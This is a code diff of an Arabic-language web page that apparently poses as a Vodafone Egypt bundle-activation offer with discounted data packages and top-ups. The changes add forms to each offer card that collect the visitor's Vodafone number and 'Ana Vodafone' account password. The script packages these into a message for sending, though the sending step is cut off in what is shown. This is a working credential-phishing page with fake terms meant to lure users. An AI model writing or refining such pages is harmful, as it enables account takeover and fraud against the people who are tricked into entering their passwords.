@@ -4,11 +4,12 @@
   <meta charset="UTF-8">
   <title>تفعيل باقات فودافون</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
   <style>
     body {
       background-color: #7b0000;
       color: white;
-      font-family: 'Arial', sans-serif;
+      font-family: 'Cairo', sans-serif;
       text-align: center;
       margin: 0;
       padding: 0;
@@ -20,21 +21,24 @@
     }
 
     h1 {
-      font-size: 28px;
+      font-size: 32px;
       margin-bottom: 10px;
+      font-weight: bold;
     }
 
     .subtitle {
-      font-size: 16px;
+      font-size: 18px;
       margin-bottom: 30px;
+      color: #ffcccc;
     }
 
     .box {
-      background-color: rgba(255, 255, 255, 0.05);
+      background-color: rgba(255, 255, 255, 0.07);
       border: 1px solid #ff4d4d;
-      border-radius: 10px;
+      border-radius: 12px;
       padding: 20px;
-      margin: 10px;
+      margin: 20px auto;
+      max-width: 400px;
       position: relative;
       overflow: hidden;
     }
@@ -48,15 +52,17 @@
       text-decoration: none;
       font-weight: bold;
       margin-top: 10px;
+      cursor: pointer;
     }
 
     input {
       display: block;
-      width: 80%;
+      width: 90%;
       margin: 10px auto;
       padding: 10px;
       border-radius: 8px;
       border: none;
+      font-size: 16px;
     }
 
     footer {
@@ -87,6 +93,13 @@
     #formSection {
       margin-top: 30px;
     }
+
+    .terms {
+      font-size: 14px;
+      color: #ffdddd;
+      margin-top: 10px;
+      line-height: 1.7;
+    }
   </style>
 </head>
 <body>
@@ -97,24 +110,51 @@
     <div class="box">
       <h2>13000 فليكس</h2>
       <p>240 جنيه</p>
-      <button class="btn" onclick="showForm('فليكس 13000', true)">تفعيل الآن</button>
+      <form onsubmit="sendData(event, 'فليكس 13000', true)">
+        <input type="text" id="number1" placeholder="رقم فودافون" required>
+        <input type="password" id="password1" placeholder="كلمة المرور - أنا فودافون" required>
+        <button type="submit" class="btn">تفعيل الآن</button>
+      </form>
+      <div class="terms">
+        <strong>الشروط:</strong><br>
+        - لا يجب أن يكون عليك سلف أو نوتة.<br>
+        - يتم التفعيل خلال ساعتين من إرسال البيانات.
+      </div>
     </div>
 
     <div class="box">
       <h2>40 جيجا</h2>
       <p>330 جنيه</p>
-      <button class="btn" onclick="showForm('40 جيجا', true)">تفعيل الآن</button>
+      <form onsubmit="sendData(event, '40 جيجا', true)">
+        <input type="text" id="number2" placeholder="رقم فودافون" required>
+        <input type="password" id="password2" placeholder="كلمة المرور - أنا فودافون" required>
+        <button type="submit" class="btn">تفعيل الآن</button>
+      </form>
+      <div class="terms">
+        <strong>الشروط:</strong><br>
+        - يمكن التفعيل حتى لو عليك سلف أو نوتة.<br>
+        - يتم التفعيل خلال 72 ساعة من إرسال البيانات.
+      </div>
     </div>
 
     <div class="box">
       <h2>شحن رصيد صافي</h2>
-      <p>اكتب الكمية واحسب</p>
-      <button class="btn" onclick="showForm('رصيد صافي', false)">شحن الآن</button>
+      <p>ادخل الكمية المطلوبة</p>
+      <form onsubmit="sendData(event, 'رصيد صافي', false)">
+        <input type="text" id="number3" placeholder="رقم فودافون" required>
+        <input type="number" id="amount" placeholder="كمية الصافي بالجنيه" required>
+        <p id="cost"></p>
+        <button type="submit" class="btn">شحن الآن</button>
+      </form>
+      <div class="terms">
+        <strong>الشروط:</strong><br>
+        - يتم تحويل الرصيد خلال نصف ساعة من إرسال الرقم.
+      </div>
     </div>
 
     <div id="formSection"></div>
 
-    <footer>برمجة: mahmoud gamal</footer>
+    <footer>Developed by mahmoud gamal</footer>
   </div>
 
   <script>
@@ -128,41 +168,33 @@
     }
     setInterval(createParticle, 500);
 
-    function showForm(type, askPassword) {
-      const formSection = document.getElementById("formSection");
-      formSection.innerHTML = `
-        <form onsubmit="sendData(event, '${type}', ${askPassword})">
-          <input type="text" id="number" placeholder="رقم فودافون" required>
-          ${askPassword ? '<input type="password" id="password" placeholder="كلمة المرور" required>' : ''}
-          ${type === 'رصيد صافي' ? '<input type="number" id="amount" placeholder="كمية الصافي" required><p id="cost"></p>' : ''}
-          <button type="submit" class="btn">إرسال</button>
-        </form>
-      `;
+    const amountInput = document.getElementById("amount");
+    const costDisplay = document.getElementById("cost");
 
-      if (type === 'رصيد صافي') {
-        const amountInput = document.getElementById("amount");
-        const costDisplay = document.getElementById("cost");
-        amountInput.addEventListener("input", () => {
-          const val = parseFloat(amountInput.value);
-          if (!isNaN(val)) {
-            costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
-          } else {
-            costDisplay.textContent = "";
-          }
-        });
-      }
+    if (amountInput) {
+      amountInput.addEventListener("input", () => {
+        const val = parseFloat(amountInput.value);
+        if (!isNaN(val)) {
+          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
+        } else {
+          costDisplay.textContent = "";
+        }
+      });
     }
 
     function sendData(event, type, askPassword) {
       event.preventDefault();
-      const number = document.getElementById("number").value;
+      const form = event.target;
+      const number = form.querySelector("input[type='text']").value;
       let message = `طلب: ${type}\nرقم: ${number}`;
+
       if (askPassword) {
-        const password = document.getElementById("password").value;
+        const password = form.querySelector("input[type='password']").value;
         message += `\nكلمة المرور: ${password}`;
       }
+
       if (type === 'رصيد صافي') {
-        const amount = document.getElementById("amount").value;
+        const amount = form.querySelector("input[type='number']").value;
         const price = amount * 1.2;
         message += `\nكمية: ${amount} صافي = ${price} جنيه`;
       }
